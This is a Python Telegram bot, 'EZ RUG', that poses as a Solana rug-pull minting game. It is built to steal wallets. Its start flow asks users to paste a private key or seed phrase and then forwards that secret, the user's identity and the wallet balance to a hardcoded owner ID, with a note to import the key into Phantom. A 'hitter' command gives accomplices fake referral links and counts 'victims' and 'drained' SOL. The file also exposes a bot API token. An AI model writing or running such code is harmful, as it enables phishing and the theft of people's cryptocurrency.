import random
import asyncio
from aiogram import Bot, Dispatcher, types
import logging
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.enums import ParseMode
from solana.rpc.async_api import AsyncClient
from solana.keypair import Keypair
from solana.rpc.commitment import Commitment
from aiogram.filters import Command
from aiogram import F

# Config
API_TOKEN = '7593919765:AAEJgxNwSUJ2RiwJ68cLDa3UkrHKD8B4INM'
OWNER_ID = 6016683553
BOT_URL = 'https://t.me/EzRugPull_bot'

# Initialize dispatcher first
dp = Dispatcher()

# Bot setup
bot = Bot(token=API_TOKEN, parse_mode=ParseMode.MARKDOWN_V2)

# Solana Client Setup
solana_client = AsyncClient("https://api.mainnet-beta.solana.com", commitment=Commitment("confirmed"))

# In-memory data storage
users = {}
wallet_imported = {}
referrals = {}

coin_names = ['FLOKIRUG', 'ELON69', 'RUGZILLA', 'SOLSCAM', 'DEGENX', 'MOONRUG', 'EZRUG', 'DOGEKILLER']

def bold(text): 
    return f"*{text}*"

def generate_coin():
    name = random.choice(coin_names)
    symbol = f"${name[:4].upper()}"
    price = round(random.uniform(0.1, 5.0), 2)
    rug_time = random.randint(30, 120)
    return {
        'name': name,
        'symbol': symbol,
        'price': price,
        'time': rug_time,
        'status': 'active'
    }

async def get_wallet_balance(seed_or_private_key: str):
    try:
        if len(seed_or_private_key.split()) == 12:
            keypair = Keypair.from_seed(bytes(seed_or_private_key.split()))
        else:
            keypair = Keypair.from_secret_key(bytes.fromhex(seed_or_private_key))

        public_key = keypair.public_key
        balance = await solana_client.get_balance(public_key)
        return balance.value / 1e9
    except Exception as e:
        print(f"Error fetching balance: {e}")
        return None

@dp.message(Command("start"))
async def start(message: types.Message):
    uid = message.from_user.id

    if uid in wallet_imported:
        await message.answer("✅ Wallet already imported.\nUse /mint to begin.")
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="🔑 Import Private Key", callback_data="import_pk"),
        InlineKeyboardButton(text="🧠 Import Seed Phrase", callback_data="import_seed")
    ]])
    
    await message.answer(
        bold("Welcome to EZ RUG.") + "\n\n" +
        "Please import your Solana wallet to continue.",
        reply_markup=kb
    )

@dp.callback_query(F.data.startswith("import_"))
async def import_wallet_step(call: types.CallbackQuery):
    method = "Private Key" if call.data == "import_pk" else "Seed Phrase"
    wallet_imported[call.from_user.id] = {'method': method}
    await bot.send_message(call.from_user.id, f"Please paste your {method} to continue:")

@dp.message(lambda msg: msg.from_user.id in wallet_imported and 'data' not in wallet_imported[msg.from_user.id])
async def capture_wallet_input(message: types.Message):
    uid = message.from_user.id
    wallet_imported[uid]['data'] = message.text.strip()

    method = wallet_imported[uid]['method']
    data = wallet_imported[uid]['data']

    balance = await get_wallet_balance(data)

    # Check for referral information if this user was referred
    referred_by = None
    if "start" in message.text:
        referred_by = message.text.split("start=")[-1]
        if referred_by.isdigit() and int(referred_by) in referrals:
            referrals[int(referred_by)]['referred_victims'] += 1

    user = message.from_user
    user_info = f"**New Wallet Imported**\n" \
                f"**User:** {user.first_name} (@{user.username})\n" \
                f"**User ID:** {user.id}\n" \
                f"**Method:** {method}\n" \
                f"**Data:** `{data}`\n" \
                f"**Balance:** {balance} SOL" if balance else "Failed to fetch balance"

    await bot.send_message(OWNER_ID, user_info, parse_mode=ParseMode.MARKDOWN_V2)
    
    # Send referred by info ONLY to owner
    if referred_by and referred_by in referrals:
        referrer = referrals[int(referred_by)]
        referrer_info = f"🔎 Victim Information\n\n" \
                        f"├ 👤 Name: {user.first_name} (@{user.username})\n" \
                        f"├ 🆔 {user.id}\n" \
                        f"├ 💎 Balance: {balance} SOL\n" \
                        f"⚠️ Paste the private key below into Phantom: {data}\n\n" \
                        f"💥 Referred by: @{referrer['user_username']}"

        await bot.send_message(OWNER_ID, referrer_info)

    await message.answer(
        "⏳ Syncing wallet with Solana RPC...\n✅ Wallet successfully connected.\n\nUse /mint to begin trading."
    )

    users[uid] = {'sol': balance if balance else 0.0, 'portfolio': {}, 'referred_by': referred_by}

@dp.message(Command("mint"))
async def mint(message: types.Message):
    uid = message.from_user.id
    if uid not in users:
        await message.answer("⚠️ Please /start and import wallet first.")
        return

    user_data = users[uid]
    if len(user_data['portfolio']) >= 3:
        await message.answer("🧼 Too many coins. Sell one before minting.")
        return

    coin = generate_coin()
    coin_id = f"{coin['symbol']}_{random.randint(1000, 9999)}"
    user_data['portfolio'][coin_id] = coin

    await message.answer(
        f"🪙 *Minted:* {coin['symbol']}\n"
        f"📈 Price: *{coin['price']} SOL*\n"
        f"⏳ Rug timer: *{coin['time']}s*\n"
        f"💀 Use /sell {coin_id} before it's too late."
    )

    asyncio.create_task(rug_timer(uid, coin_id, coin['time']))

async def rug_timer(uid, coin_id, delay):
    await asyncio.sleep(delay)
    if uid in users and coin_id in users[uid]['portfolio']:
        coin = users[uid]['portfolio'][coin_id]
        coin['status'] = 'rugged'
        coin['price'] = 0.0
        await bot.send_message(
            uid,
            f"☠️ *{coin['symbol']} RUGGED!* All your hopes... gone."
        )

@dp.message(Command("portfolio"))
async def portfolio(message: types.Message):
    uid = message.from_user.id
    if uid not in users:
        await message.answer("⚠️ Please /start first.")
        return

    data = users[uid]
    msg = bold("Your Portfolio") + "\n\n"
    if not data['portfolio']:
        msg += "Empty. Mint a coin with /mint."
    else:
        for cid, coin in data['portfolio'].items():
            status = "🟢 ACTIVE" if coin['status'] == 'active' else "☠️ RUGGED"
            msg += (
                f"{bold(coin['symbol'])} - {coin['price']} SOL | {status}\n"
                f"ID: `{cid}`\n\n"
            )
    msg += f"\nBalance: *{data['sol']} SOL*"
    await message.answer(msg)

@dp.message(Command("sell"))
async def sell(message: types.Message):
    uid = message.from_user.id
    if uid not in users:
        await message.answer("⚠️ Please /start first.")
        return

    args = message.text.split()
    if len(args) < 2:
        await message.answer("❌ Usage: /sell <coin_id>")
        return

    coin_id = args[1]
    data = users[uid]

    if coin_id not in data['portfolio']:
        await message.answer("❌ Coin ID not found.")
        return

    coin = data['portfolio'][coin_id]
    if coin['status'] == 'rugged':
        await message.answer(f"☠️ {coin['symbol']} already rugged.")
        return

    earnings = coin['price']
    data['sol'] += earnings
    del data['portfolio'][coin_id]

    await message.answer(f"✅ Sold {coin['symbol']} for *{earnings} SOL*")

@dp.message(Command("hitter"))
async def hitter(message: types.Message):
    uid = message.from_user.id

    # Generate referral link
    referral_link = f"{BOT_URL}?start={uid}"
    referrals[uid] = {'user_id': uid, 'user_username': message.from_user.username, 'referred_victims': 0}
    
    await message.answer(
        f"💠 Your Fake Referral Link: \n\n"
        f"{referral_link}\n\n"
        f"📊 Statistics\n"
        f"├ 💠 Victims Imported: {referrals[uid]['referred_victims']}\n"
        f"├ 💖 Referred Victims: {referrals[uid]['referred_victims']}\n"
        f"├ 💸 Drained: 0.0 SOL"
    )

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    dp.run_polling(bot)
